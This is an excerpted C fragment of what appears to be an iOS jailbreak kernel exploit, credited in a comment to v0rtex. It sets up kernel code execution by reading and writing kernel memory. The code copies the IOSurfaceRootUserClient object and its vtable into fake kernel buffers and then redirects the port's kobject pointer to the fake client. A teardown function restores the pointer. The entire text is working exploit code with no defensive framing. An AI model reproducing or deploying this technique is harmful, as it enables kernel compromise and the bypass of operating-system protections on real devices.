...
bool init_kexecute()
{
    ...
    current_task = ReadKernel64(task_self_addr() + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
...
#else
    user_client = newClientSP_s31;//prepare_user_client();
    if (!MACH_PORT_VALID(user_client)) return false;
    //int apid = getpid();
    // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
    IOSurfaceRootUserClient_port = iosruc_port_OOB1;// get_address_of_port(apid, user_client); // UserClients are just mach_ports, so we find its address
    if (!ISADDR(IOSurfaceRootUserClient_port)) return false;
    
    IOSurfaceRootUserClient_addr = iosruc_addr_OOB1;//rk64SP(IOSurfaceRootUserClient_port + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
    if (!ISADDR(IOSurfaceRootUserClient_addr)) return false;
    
    uint64_t IOSurfaceRootUserClient_vtab = rk64SP(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
    ...
    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_vtable + i * 8, rk64SP(IOSurfaceRootUserClient_vtab + i * 8));
    }
    ...
    for (int i = 0; i < 0x200; i++) {
        WriteKernel64(fake_client + i * 8, rk64SP(IOSurfaceRootUserClient_addr + i * 8));
    }
    ...
    WriteKernel64(IOSurfaceRootUserClient_port + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
...
void term_kexecute()
{
    ...
    kernel_call_deinit();
#else
    WriteKernel64(IOSurfaceRootUserClient_port + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
